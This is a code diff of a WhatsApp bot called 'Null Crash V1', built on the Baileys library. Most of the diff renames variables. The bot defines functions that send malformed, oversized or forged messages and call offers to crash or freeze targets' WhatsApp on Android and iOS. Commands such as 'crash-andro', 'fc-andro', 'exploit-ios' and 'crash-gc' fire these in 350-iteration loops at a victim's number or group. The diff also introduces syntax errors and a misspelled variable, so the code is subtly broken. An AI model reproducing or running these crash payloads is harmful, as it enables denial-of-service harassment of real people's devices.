@@ -1,83 +1,64 @@
-require("./settings");
-
-const {
-    default: makeWASocket,
-    useMultiFileAuthState,
-    DisconnectReason,
-    fetchLatestBaileysVersion,
-    makeCacheableSignalKeyStore,
-    delay,
-    generateForwardMessageContent,
-    generateWAMessageFromContent,
-    jidDecode,
-    jidNormalizedUser
+const { 
+default: baileys, 
+proto, 
+getContentType, 
+generateWAMessage, 
+generateWAMessageFromContent, 
+generateWAMessageContent,
+prepareWAMessageMedia, 
+downloadContentFromMessage
 } = require("@whiskeysockets/baileys");
 
 const axios = require('axios');
-const fs = require('fs-extra');
-const crypto = require("crypto");
-const util = require('util');
-const chalk = require('chalk');
+const fs = require('fs-extra')
+const crypto = require("crypto")
+const util = require('util')
+const chalk = require('chalk')
 const { addPremiumUser, delPremiumUser } = require("./lib/premium");
-const sleep = async (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
-function runtime(seconds) {
-  seconds = Number(seconds);
-  const d = Math.floor(seconds / (3600 * 24));
-  const h = Math.floor((seconds % (3600 * 24)) / 3600);
-  const m = Math.floor((seconds % 3600) / 60);
-  const s = Math.floor(seconds % 60);
-  return `${d > 0 ? d + "d " : ""}${h > 0 ? h + "h " : ""}${m > 0 ? m + "m " : ""}${s}s`;
-}
 //===============
-module.exports = async (waSocket, message, chatUpdate, store) => {
-
-const det = waSocket;
-const m = message;  
-const n = message;
-const sock = waSocket;
-
+module.exports = minato = async (minato, m, chatUpdate, store) => {
 try {
 const body = (
-n.mtype === "conversation" ? n.message.conversation :
-n.mtype === "imageMessage" ? n.message.imageMessage.caption :
-n.mtype === "videoMessage" ? n.message.videoMessage.caption :
-n.mtype === "extendedTextMessage" ? n.message.extendedTextMessage.text :
-n.mtype === "buttonsResponseMessage" ? n.message.buttonsResponseMessage.selectedButtonId :
-n.mtype === "listResponseMessage" ? n.message.listResponseMessage.singleSelectReply.selectedRowId :
-n.mtype === "interactiveResponseMessage" ? JSON.parse(n.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
-n.mtype === "templateButtonReplyMessage" ? n.message.templateButtonReplyMessage.selectedId :
-n.mtype === "messageContextInfo" ?
-n.message.buttonsResponseMessage?.selectedButtonId ||
-n.message.listResponseMessage?.singleSelectReply.selectedRowId ||
-n.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
-n.text : "");
+m.mtype === "conversation" ? m.message.conversation :
+m.mtype === "imageMessage" ? m.message.imageMessage.caption :
+m.mtype === "videoMessage" ? m.message.videoMessage.caption :
+m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
+m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
+m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
+m.mtype === "interactiveResponseMessage" ? JSON.parse(m.message.interactiveResponseMessage.nativeFlowResponseMessage.paramsJson).id :
+m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
+m.mtype === "messageContextInfo" ?
+m.message.buttonsResponseMessage?.selectedButtonId ||
+m.message.listResponseMessage?.singleSelectReply.selectedRowId ||
+m.message.InteractiveResponseMessage.NativeFlowResponseMessage ||
+m.text : "");
 
 const prefix = (typeof body === "string" ? global.prefix.find(p => body.startsWith(p)) : null) || "";  
 const isCmd = !!prefix;  
 const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : []; 
 const command = isCmd ? body.slice(prefix.length).trim().split(/ +/)[0].toLowerCase() : "";
 const text = args.join(" "); 
-const fatkuns = n.quoted || m;
+const fatkuns = m.quoted || m;
 const quoted = ["buttonsMessage", "templateMessage", "product"].includes(fatkuns.mtype)
 ? fatkuns[Object.keys(fatkuns)[1] || Object.keys(fatkuns)[0]]
 : fatkuns;
 //======================
-const botNumber = jidNormalizedUser(det.user.id) || jidDecode(det.user.id)?.user + "@s.whatsapp.net";
-const sender = n.sender;
-const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(n.sender);
-const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(n.sender);
-if (!det.public && !isCreator) return;
+const botNumber = await minato.decodeJid(minato.user.id);
+const sender = m.sender;
+const isCreator = [botNumber, ...global.owner].map(v => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(m.sender);
+const isPremium = [botNumber, ...global.owner, ...premuser.map(user => user.id.replace(/[^0-9]/g, "") + "@s.whatsapp.net")].includes(m.sender);
+if (!minato.public && !isCreator) return;
 
 //======================
-const isGroup = n.chat.endsWith("@g.us");
-const groupMetadata = isGroup ? await det.groupMetadata(n.chat).catch(() => ({})) : {};
+const isGroup = m.chat.endsWith("@g.us");
+const groupMetadata = isGroup ? await minato.groupMetadata(m.chat).catch(() => ({})) : {};
 const participants = groupMetadata.participants || [];
 const groupAdmins = participants.filter(v => v.admin).map(v => v.id);
-const senderbot = n.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" || det.user.id : n.key.participant || n.key.remoteJid;
+const senderbot = m.key.fromMe ? sock.user.id.split(':')[0] + "@s.whatsapp.net" || minato.user.id : m.key.participant || m.key.remoteJid;
         const senderId = senderbot.split('@')[0];
 const isBotAdmins = groupAdmins.includes(botNumber);
-const isAdmins = groupAdmins.includes(n.sender);
+const isAdmins = groupAdmins.includes(m.sender);
 const groupName = groupMetadata.subject || "";
 let example = (teks) => {
 return `\n\`ᴡʀᴏɴɢ ᴄᴏᴍᴍᴀɴᴅ\` \n *ᴇxᴀᴍᴘʟᴇ ᴏғ ᴜsᴀɢᴇ* :*\nᴛʏᴘᴇ *cmd*${cmd}* ${teks}\n`
@@ -113,9 +94,9 @@ const HKQuoted = {
   }
 };
 
-const from = n.key.remoteJid || "";
+const from = m.key.remoteJid || "";
 
-const reply = (teks) => det.sendMessage(n.chat, { text: teks }, { quoted: HKQuoted });
+const reply = (teks) => minato.sendMessage(m.chat, { text: teks }, { quoted: HKQuoted });
 
 async function doneress () {
   if (!text) throw "Done Response"
@@ -132,14 +113,14 @@ async function doneress () {
  𝑷𝒍𝒆𝒂𝒔𝒆 𝑷𝒂𝒖𝒔𝒆 𝟏𝟎 𝑴𝒊𝒏𝒖𝒕𝒆𝒔
 ` 
   
-  det.sendMessage(n.chat, {
+  minato.sendMessage(m.chat, {
     video: {
-      url: 'https://files.catbox.moe/3uhyy5.mp4'
+      url: 'https://files.catbox.moe/3uhyy5.mp4' 
     },
     caption: ressdone,
     gifPlayback: true,  
     contextInfo: {
-      mentionedJid: [n.sender],
+      mentionedJid: [m.sender],
       externalAdReply: {
         showAdAttribution: false,
         title: 'Nᴜʟʟ Cʀᴀsʜ V𝟷',
@@ -162,12 +143,12 @@ async function doneress () {
 //=================== ( Console Message ) ===========\\
 console.log("┏━━━━━━━━━━━━━━━━━━━━━━━=");
 console.log(`┃¤ ${chalk.hex("#FFD700").bold(" MASSAGE")} ${chalk.hex("#00FFFF").bold(`[${new Date().toLocaleTimeString()}]`)} `);
-console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Sender:")} ${chalk.hex("#FFFFFF")(`${n.pushName} (${n.sender})`)} `);
+console.log(`┃¤ ${chalk.hex("#FF69B4")("💌 Sender:")} ${chalk.hex("#FFFFFF")(`${m.pushName} (${m.sender})`)} `);
 console.log(`┃¤ ${chalk.hex("#FFA500")("📍 In:")} ${chalk.hex("#FFFFFF")(`${groupName || "Private Chat"}`)} `);
 console.log(`┃¤ ${chalk.hex("#00FF00")("📝 message :")} ${chalk.hex("#FFFFFF")(`${body || m?.mtype || "Unknown"}`)} `);
 console.log("┗━━━━━━━━━━━━━━━━━━━━━━━=")}
 //=============(   Bugs functions  ) ======\\
-async function xxx(det, target) {
+async function xxx(minato, target) {
     
     const msg2 = {
         interactiveMessage: {
@@ -227,12 +208,12 @@ async function xxx(det, target) {
             }
         }
          
-        await det.relayMessage(target,msg2,{
+        await minato.relayMessage(target,msg2,{
             participant: { jid: target }
             })
 }
 
-async function bulldozer(det, target) {
+async function bulldozer(minato, target) {
   let message = {
     viewOnceMessage: {
       message: {
@@ -287,7 +268,7 @@ async function bulldozer(det, target) {
 
   let msg = generateWAMessageFromContent(target, message, {});
 
-  await det.relayMessage("status@broadcast", msg.message, {
+  await minato.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [target],
     additionalNodes: [
@@ -312,7 +293,7 @@ async function bulldozer(det, target) {
   });
 }
 
-async function MarkDelayHardInvis(det, target) {
+async function MarkDelayHardInvis(minato, target) {
   for (let i = 0; i < 5; i++) {
     const message = {
       ephemeralMessage: {
@@ -347,7 +328,7 @@ async function MarkDelayHardInvis(det, target) {
               tag: "meta",
 
               forwardedAiBotMessageInfo: {
-                botName: "NULL CRASH",
+                botName: "Null Crash",
                 botJid: Math.floor(Math.random() * 99999),
                 creatorName: "ZyX",
               },
@@ -358,12 +339,12 @@ async function MarkDelayHardInvis(det, target) {
     };
 
     try {
-      await det.relayMessage(target, message, {});
+      await minato.relayMessage(target, message, {});
     } catch {}
   }
 }
 
-async function ghj(det, target) {
+async function ghj(minato, target) {
   while (true) {
     try {   
       const Andros = {
@@ -384,7 +365,7 @@ async function ghj(det, target) {
         }
       };
 
-      await det.relayMessage(target, Andros, { 
+      await minato.relayMessage(target, Andros, { 
         participant: { jid: target } 
       });
       
@@ -399,7 +380,7 @@ async function ghj(det, target) {
   }
 }
 
-async function SuperBugs(det, target) {
+async function SuperBugs(minato, target) {
   const msg = {
     groupStatusMessageV2: {
       message: {
@@ -467,7 +448,7 @@ async function SuperBugs(det, target) {
     }
   };
 
-  await det.relayMessage(target, msg, {});
+  await minato.relayMessage(target, msg, {});
 }
 
 async function LoseBuldo(target) {
@@ -477,7 +458,7 @@ async function LoseBuldo(target) {
         extendedTextMessage: {
           text: "",
           contextInfo: {
-            stanzaId: det.generateMessageTag ? det.generateMessageTag() : Date.now().toString(),
+            stanzaId: minato.generateMessageTag ? minato.generateMessageTag() : Date.now().toString(),
             participant: "0@s.whatsapp.net",
             remoteJid: "696969696969@s.whatsapp.net",
             mentionedJid: [
@@ -534,8 +515,8 @@ async function LoseBuldo(target) {
         },
       };
 
-      await det.relayMessage(target, sejaya, {
-        messageId: det.generateMessageTag ? minzto.generateMessageTag() : (Date.now() + i).toString()
+      await minato.relayMessage(target, sejaya, {
+        messageId: minato.generateMessageTag ? minzto.generateMessageTag() : (Date.now() + i).toString()
       });
       
       console.log("Buldozzer " + (i + 1));
@@ -580,7 +561,7 @@ async function MakluGwEvve(target) {
     }
   }
 
-  return await det.relayMessage("status@broadcast", Ridzz, {
+  return await minato.relayMessage("status@broadcast", Ridzz, {
     statusJidList: [target],
     additionalNodes: [
       {
@@ -604,7 +585,7 @@ async function MakluGwEvve(target) {
   });
 }
 
-async function Whatsapps(det, target) {
+async function Whatsapps(minato, target) {
  const {
     encodeSignedDeviceIdentity,
         jidEncode,
@@ -615,10 +596,10 @@ async function Whatsapps(det, target) {
     } = require("@whiskeysockets/baileys");
     
 let devices = (
-await det.getUSyncDevices([target], false, false)
+await minato.getUSyncDevices([target], false, false)
 ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);
 
-await det.assertSessions(devices)
+await minato.assertSessions(devices)
 
 let privt = () => {
 let map = {};
@@ -636,18 +617,18 @@ return map[key].task;
 
 let vion = privt();
 let vionv1 = buf => Buffer.concat([Buffer.from(buf), Buffer.alloc(8, 1)]);
-let Official = det.createParticipantNodes.bind(det);
-let vionoc = det.encodeWAMessage?.bind(det);
+let Official = minato.createParticipantNodes.bind(minato);
+let vionoc = minato.encodeWAMessage?.bind(minato);
 
-det.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
+minato.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
 if (!recipientJids.length) return { nodes: [], shouldIncludeDeviceIdentity: false };
 
-let patched = await (det.patchMessageBeforeSending?.(message, recipientJids) ?? message);
+let patched = await (minato.patchMessageBeforeSending?.(message, recipientJids) ?? message);
 let memeg = Array.isArray(patched)
 ? patched
 : recipientJids.map(jid => ({ recipientJid: jid, message: patched }));
 
-let { id: meId, lid: meLid } = det.authState.creds.me;
+let { id: meId, lid: meLid } = minato.authState.creds.me;
 let omak = meLid ? jidDecode(meLid)?.user : null;
 let shouldIncludeDeviceIdentity = false;
 
@@ -661,7 +642,7 @@ if (dsmMessage && isOwnUser && !y) msg = dsmMessage;
 let bytes = vionv1(vionoc ? vionoc(msg) : encodeWAMessage(msg));
 
 return vion.mutex(jid, async () => {
-let { type, ciphertext } = await det.signalRepository.encryptMessage({ jid, data: bytes });
+let { type, ciphertext } = await minato.signalRepository.encryptMessage({ jid, data: bytes });
 if (type === 'pkmsg') shouldIncludeDeviceIdentity = true;
 return {
 tag: 'to',
@@ -676,16 +657,16 @@ return { nodes: nodes.filter(Boolean), shouldIncludeDeviceIdentity };
 
 let Exo = crypto.randomBytes(32);
 let Floods = Buffer.concat([Exo, Buffer.alloc(8, 0x01)]);
-let { nodes: destinations, shouldIncludeDeviceIdentity } = await det.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
+let { nodes: destinations, shouldIncludeDeviceIdentity } = await minato.createParticipantNodes(devices, { conversation: "y" }, { count: '0' });
 
 let vionlast = {
 tag: "call",
-attrs: { to: target, id: det.generateMessageTag(), from: det.user.id },
+attrs: { to: target, id: minato.generateMessageTag(), from: minato.user.id },
 content: [{
 tag: "offer",
 attrs: {
 "call-id": crypto.randomBytes(16).toString("hex").slice(0, 64).toUpperCase(),
-"call-creator": det.user.id
+"call-creator": minato.user.id
 },
 content: [
 { tag: "audio", attrs: { enc: "opus", rate: "16000" } },
@@ -713,7 +694,7 @@ content: encodeSignedDeviceIdentity(sock.authState.creds.account, true)
 ]
 }]
 };
-await det.sendNode(vionlast);
+await minato.sendNode(vionlast);
 
 const andros = {
        interactiveMessage: {
@@ -733,7 +714,7 @@ const andros = {
         }
     };
 
-  await det.relayMessage(target, andros, {
+  await minato.relayMessage(target, andros, {
     participant: { jid: target },
     messageId: null,
     userJid: target,
@@ -830,7 +811,7 @@ let NanMsg2 = generateWAMessageFromContent(target, {
         background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "9"),
     });
 
-  await det.relayMessage("status@broadcast", NanMsg1.message, {
+  await minato.relayMessage("status@broadcast", NanMsg1.message, {
     messageId: NanMsg1.key.id,
     statusJidList: [target],
     additionalNodes: [
@@ -854,7 +835,7 @@ let NanMsg2 = generateWAMessageFromContent(target, {
     ],
   });
   
-  await det.relayMessage("status@broadcast", NanMsg2.message, {
+  await minato.relayMessage("status@broadcast", NanMsg2.message, {
     messageId: NanMsg2.key.id,
     statusJidList: [target],
     additionalNodes: [
@@ -879,7 +860,7 @@ let NanMsg2 = generateWAMessageFromContent(target, {
   });
   
   if (mention) {
-    await det.relayMessage(
+    await minato.relayMessage(
       target,
       {
     statusMentionMessage: {
@@ -905,9 +886,9 @@ let NanMsg2 = generateWAMessageFromContent(target, {
   }
 }
 
-async function CV14(det, target) {
+async function CV14(minato, target) {
   for (let i = 0; i < 2; i++) {
-    await det.relayMessage(target, {
+    await minato.relayMessage(target, {
     viewOnceMessage: {
     message: {
       interactiveMessage: {
@@ -1002,7 +983,7 @@ async function CV14(det, target) {
   }
 }
 
-async function ForcloseClick(det, target) {
+async function ForcloseClick(minato, target) {
   const delay = ms => new Promise(res => setTimeout(res, ms));
 
   try {
@@ -1027,13 +1008,13 @@ async function ForcloseClick(det, target) {
           background: { id: "default" }
         },
         paymentLinkMetadata: {
-          title: "CRIMSON" + "ꦽ".repeat(90000),
+          title: "CRIMSON" + "ꦽ".repeat(90000)
           subtitle: "𝑅𝑖𝑑𝑧𝑧",
           currencyCode: "IDR"
         }
       });
 
-      await det.sendMessage(target, {
+      await minato.sendMessage(target, {
         location: {
           degreesLatitude: -6.200000,
           degreesLongitude: 106.816666,
@@ -1050,7 +1031,7 @@ async function ForcloseClick(det, target) {
   }
 }
 
-async function CrashTempuek(det, target) {
+async function CrashTempuek(minato, target) {
   const quotedios = {
     key: {
       remoteJid: "13135559098@s.whatsapp.net",
@@ -1113,14 +1094,14 @@ async function CrashTempuek(det, target) {
     }
   }, { userJid: target, quoted: quotedios });
 
-  await det.relayMessage(target, message.message, {
+  await minato.relayMessage(target, message.message, {
     messageId: message.key.id,
     statusJidList: [target]
   });
 }
 
-async function StickerCrash(det, target) {
-  await det.relayMessage(
+async function StickerCrash(minato, target) {
+  await minato.relayMessage(
     target,
     {
       stickerPackMessage: {
@@ -1194,7 +1175,7 @@ async function StickerCrash(det, target) {
   );
 }
 
-async function IosInvisible(det, target) {
+async function IosInvisible(minato, target) {
    try {
       let locationMessage = {
          degreesLatitude: -9.09999262999,
@@ -1233,7 +1214,7 @@ async function IosInvisible(det, target) {
       }, {});
 
       for (const msg of [msg1, msg2]) {
-         await det.relayMessage('status@broadcast', msg.message, {
+         await minato.relayMessage('status@broadcast', msg.message, {
             messageId: msg.key.id,
             statusJidList: [targetJid],
             additionalNodes: [{
@@ -1260,16 +1241,16 @@ async function IosInvisible(det, target) {
 switch (command ) {
 
 case "menu": case "null": {
-await det.sendMessage(n.chat, {react: {text: '⌛', key: n.key}})
-await det.sendMessage(n.chat, {react: {text: '⏳', key: n.key}})
-await det.sendMessage(n.chat, {react: {text: '✅', key: n.key}})
+await minato.sendMessage(m.chat, {react: {text: '⌛', key: m.key}})
+await minato.sendMessage(m.chat, {react: {text: '⏳', key: m.key}})
+await minato.sendMessage(m.chat, {react: {text: '✅', key: m.key}})
 let Menu = `
 ━━━━━━━━━━━━━━━━━━━━
     ʙᴏᴛ ɪɴғᴏ
 ━━━━━━━━━━━━━━━━━━━━
 𐓷  _ᴄʀᴇᴀᴛᴏʀ: ꪶ ¡ϻ Nᴜʟʟ ꫂ_
 𐓷  _ʙᴏᴛ ɴᴀᴍᴇ: Nᴜʟʟ Cʀᴀsʜ V𝟷_
-𐓷  _ᴠᴇʀ𝚜ɪᴏɴ: v1.0.0_
+𐓷  _ᴠᴇʀ𝚜ɪᴏɴ: v5.0.0_
 𐓷  _𝚜ᴛᴀᴛᴜᴛ:  ᴀᴄᴛɪғ_
 𐓷  _ʀᴜɴᴛɪᴍᴇ: ${runtime(process.uptime())}_
 𐓷  _ᴘʀᴇғɪ𝚡ᴇ: мᴜʟᴛɪ ᴘʀᴇғɪx_
@@ -1307,7 +1288,7 @@ let Menu = `
 𐓷 _ᴄʟᴇᴀʀʙᴜɢs_ 
 
 > Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`;
-await det.sendMessage(n.chat, {
+await minato.sendMessage(m.chat, {
 image: { url: "https://files.catbox.moe/4w8x5f.png" },
 caption: Menu
 }, { quoted: HKQuoted });
@@ -1317,14 +1298,14 @@ break;
 // ================= ( Case Public )=====================
  case "public":{
  if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
-det.public = true
+minato.public = true
  reply("*successfully changed to Public Mode*")
  }
  break;                         
 // ================= ( Case Self )=====================
 case "self":{
   if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
-  det.public = false
+  minato.public = false
  reply("*successfully changed to Self Mode*")
 
             }
@@ -1332,14 +1313,14 @@ case "self":{
 // ================= ( Case Owner )=================\\
     case 'owner': {
     const owners = [
-        { name: "ꪶ ¡ϻ Nᴜʟʟ ꫂ", number: "2347030626048" },
+        { name: " ꪶ ¡ϻ Nᴜʟʟ ꫂ", number: "2347030626048" },
     ];
     
     const vcards = owners.map(owner => 
         `BEGIN:VCARD\nVERSION:3.0\nFN:</> ${owner.name}\nTEL;type=CELL;type=VOICE;waid=${owner.number}:+${owner.number}\nEND:VCARD`
     );
     
-    await det.sendMessage(n.chat, { 
+    await minato.sendMessage(m.chat, { 
         contacts: { 
             contacts: vcards.map(vcard => ({ vcard }))
         }
@@ -1374,7 +1355,7 @@ case "delay-andro": {
    if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)
 
  
-   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
+   const PROTECTED_NUMBER = "2347030626048","242068906671";
    let victim = args[0].replace(/[^0-9]/g, "");
    
    
@@ -1392,33 +1373,33 @@ case "delay-andro": {
 𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
 𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}
 
-© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
+> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`)
    
 
-det.sendMessage(from, { react: { text: "⌛", key: n.key } })
-det.sendMessage(from, { react: { text: "⏳", key: n.key } })
+minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
+minato.sendMessage(from, { react: { text: "⏳", key: m.key } })
 
 await doneress();
 
    for (let i = 0; i < 350; i++) {
 
-     await xxx(det, target);
+     await xxx(minato, target);
      sleep(2000)
-     await MarkDelayHardInvis(det, target);
+     await MarkDelayHardInvis(minato, target);
      sleep(2000)
-     await ghj(det, target);
+     await ghj(minato, target);
      sleep(2000)
-     await SuperBugs(det, target);
+     await SuperBugs(minato, target);
      sleep(2000)
-     await MarkDelayHardInvis(det, target);
+     await MarkDelayHardInvis(minato, target);
      sleep(2000)
-     await CV14(det, target);
+     await CV14(minato, target);
      sleep(2000)
      await MakluGwEvve(target);
      
  
  }   
-det.sendMessage(from, { react: { text: "✅", key: n.key } })
+minato.sendMessage(from, { react: { text: "✅", key: m.key } })
 }
 break
 
@@ -1427,7 +1408,7 @@ case "crash-andro": {
    if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)
 
  
-   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
+   const PROTECTED_NUMBER = "2347030626048,242068906671";
    let victim = args[0].replace(/[^0-9]/g, "");
    
    
@@ -1445,11 +1426,11 @@ case "crash-andro": {
 𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
 𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}
 
-© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
+> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`)
    
 
-det.sendMessage(from, { react: { text: "⌛", key: n.key } })
-det.sendMessage(from, { react: { text: "⏳", key: n.key } })
+minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
+minato.sendMessage(from, { react: { text: "⏳", key: m.key } })
 
 await doneress();
 
@@ -1461,15 +1442,15 @@ await doneress();
      sleep(2000)
      await LoseBuldo(target);
      sleep(2000)
-     await bulldozer(det, target);
+     await bulldozer(minato, target);
      sleep(2000)
-     await bulldozer(det, target);
+     await bulldozer(minato, target);
      sleep(2000)
      await ziperrsedot(target, true) 
    
  
  }   
-det.sendMessage(from, { react: { text: "✅", key: n.key } })
+minato.sendMessage(from, { react: { text: "✅", key: m.key } })
 }
 break
 
@@ -1479,7 +1460,7 @@ case "fc-andro": {
    if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)
 
  
-   const PROTECTED_NUMBER = ["2347030626048", "242068906671","24177474264"];
+   const PROTECTED_NUMBER = "2347030626048,242068906671";
    let victim = args[0].replace(/[^0-9]/g, "");
    
    
@@ -1497,28 +1478,28 @@ case "fc-andro": {
 𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
 𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}
 
-© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
+> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`)
    
 
-det.sendMessage(from, { react: { text: "⌛", key: n.key } })
-det.sendMessage(from, { react: { text: "⏳", key: n.key } })
+minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
+minato.sendMessage(from, { react: { text: "⏳", key: m.key } })
 
 await doneress();
 
    for (let i = 0; i < 350; i++) {
 
-     await Whatsapps(det, target);
+     await Whatsapps(minato, target);
      sleep(2000)
-     await ForcloseClick(det, target);
+     await ForcloseClick(minato, target);
      sleep(2000)
-     await Whatsapps(det, target);
+     await Whatsapps(minato, target);
      sleep(2000)
-     await ForcloseClick(det, target);
+     await ForcloseClick(minato, target);
     
    
  
  }   
-det.sendMessage(from, { react: { text: "✅", key: n.key } })
+minato.sendMessage(from, { react: { text: "✅", key: m.key } })
 }
 break
 
@@ -1528,7 +1509,7 @@ case "exploit-ios": {
    if (!text) return reply(`*Format ❌*\nExample : ${command} 242xxx`)
 
  
-   const PROTECTED_NUMBER = ["2347030626048", "2349166339256","24177474264"];
+   const PROTECTED_NUMBER = "2347030626048,242068906671";
    let victim = args[0].replace(/[^0-9]/g, "");
    
    
@@ -1546,28 +1527,28 @@ case "exploit-ios": {
 𝑇𝑎𝑟𝑔𝑒𝑡 : ${pepec}
 𝐶𝑜𝑚𝑚𝑎𝑛𝑑 : ${command}
 
-© Nᴜʟʟ Cʀᴀsʜ V𝟷`)
+> Pᴏᴡᴇʀᴇᴅ ʙʏ ꪶ ¡ϻ Nᴜʟʟ ꫂ`)
    
 
-det.sendMessage(from, { react: { text: "⌛", key: n.key } })
-det.sendMessage(from, { react: { text: "⏳", key: n.key } })
+minato.sendMessage(from, { react: { text: "⌛", key: m.key } })
+minato.sendMessage(from, { react: { text: "⏳", key: m.key } })
 
 await doneress();
 
    for (let i = 0; i < 350; i++) {
 
-     await IosInvisible(det, target);
+     await IosInvisible(minato, target);
      sleep(2000)
-     await StickerCrash(det, target);
+     await StickerCrash(minato, target);
      sleep(2000)
-     await IosInvisible(det, target);
+     await IosInvisible(minato, target);
      sleep(2000)
-     await StickerCrash(det, target);
+     await StickerCrash(minato, target);
      
    
  
  }   
-det.sendMessage(from, { react: { text: "✅", key: n.key } })
+minato.sendMessage(from, { react: { text: "✅", key: m.key } })
 }
 break
 
@@ -1578,9 +1559,9 @@ case 'crash-gc': {
   let inviteCode = text.match(/chat\.whatsapp\.com\/([A-Za-z0-9]+)/)?.[1];
   if (!inviteCode) return reply("*Invalid Group Link!*");
   reply(`*Process Send Bug ${command} To Group...*`);
-  await proccesCrashGroup(det, inviteCode);
-  await proccesCrashGroup(det, inviteCode);
-  await proccesCrashGroup(det, inviteCode);
+  await proccesCrashGroup(minato, inviteCode);
+  await proccesCrashGroup(minato, inviteCode);
+  await proccesCrashGroup(minato, inviteCode);
   reply(`*Success Send Bug ${command}*`);
 }
 break;
@@ -1590,12 +1571,12 @@ case 'ping':
 case 'p':
   {
     let start = new Date;
-    let { key } = await det.sendMessage(from, { text: "*Checking latency.....*" }, { quoted: HKQuoted });
+    let { key } = await minato.sendMessage(from, { text: "*Checking latency.....*" }, { quoted: HKQuoted });
     let done = new Date - start;
     var lod = `*Pong*:\n> ⏱️ ${done}ms (${Math.round(done / 100) / 10}s)`;
     
     await sleep(1000);
-    await det.sendMessage(from, { text: lod, edit: key });
+    await minato.sendMessage(from, { text: lod, edit: key });
   }       
   break;
 
@@ -1615,21 +1596,21 @@ case 'request': case 'reportbug': {
 if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
   if (!text) return reply(`Example : ${command} Hi developer one command not working`)
   textt = `*| REQUEST/BUG |*`
-  teks1 = `\n\n*User* : @${n.sender.split("@")[0]}\n*Request/Bug* : ${text}`
-  teks2 = `\n\nHi ${n.sender}, Your request has been forwarded to my Owner*.\n*Please wait...*`
+  teks1 = `\n\n*User* : @${m.sender.split("@")[0]}\n*Request/Bug* : ${text}`
+  teks2 = `\n\nHi ${m.sender}, Your request has been forwarded to my Owner*.\n*Please wait...*`
   
   for (let i of owner) {
-    det.sendMessage(i + "@s.whatsapp.net", {
+    minato.sendMessage(i + "@s.whatsapp.net", {
       text: textt + teks1,
-      mentions: [n.sender],
+      mentions: [m.sender],
     }, {
       quoted: HKQuoted,
     })
   }
   
-  det.sendMessage(n.chat, {
+  minato.sendMessage(m.chat, {
     text: textt + teks2 + teks1,
-    mentions: [n.sender],
+    mentions: [m.sender],
   }, {
     quoted: HKQuoted,
   })
@@ -1638,16 +1619,16 @@ break;
 
 case 'clearbugs': {
 if (!isCreator) return reply("*⛔ Access denied: this command is restricted to the bot owner.*");
-if (!text) return reply(`*Invalid format ❌*\nExample: ${command} 242xxx`)
-target = n.mentionedJid[0] ? n.mentionedJid[0] : n.quoted ? n.quoted.sender : q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
